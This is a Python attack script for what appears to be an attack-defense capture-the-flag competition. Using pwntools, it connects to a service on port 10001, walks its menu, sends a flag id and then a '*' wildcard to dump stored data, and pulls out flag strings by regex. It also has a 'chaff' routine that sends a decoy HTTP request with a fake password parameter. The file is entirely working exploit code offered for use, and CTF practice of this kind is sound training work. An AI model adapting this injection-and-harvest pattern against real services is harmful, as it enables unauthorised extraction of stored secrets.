#!/usr/bin/env python3

from Base_Exploit import Exploit
from pwn import *
import re

FLAG = r'FLG[0-9A-Za-z]{13}'
TIMEOUT = 5.0
# Exploit1 script
class Exploit1(Exploit):
    def __init__(self, ip, port,flagid, name="", debug=False, debug_chaff=False):
        super().__init__(ip, port,flagid, name, debug, debug_chaff)

    def launch_exploit(self):
        self.dprint('connecting to service 1')  
        r = remote(self.ip,10001)  
        m0=r.recvline() 
        self.dprint(f'received m0:{m0}')        
        r.sendline('2')      
        m1=r.recvline()  
        self.dprint(f'received m1:{m1}')  
        r.sendline(self.flagId)
        m2=r.recvline() 
        self.dprint(f'received m2:{m2}')  
        r.sendline('*')
        m=r.recvall(timeout=TIMEOUT) 
        m =m.decode('utf-8') 
        self.dprint(f'received m:{m}')    
        match = re.search(FLAG, m)
        if match:
            self.dprint(f'FLG: {match.group(0)}')
            return match.group(0)       
        
    def launch_chaff(self):
        msg = str('GET /?page=update.php&name=name&password=FLGpassword HTTP/1.1')
        self.dprint(msg)
        self.write_file(msg)
        self.send(msg,self.sock)

    

   


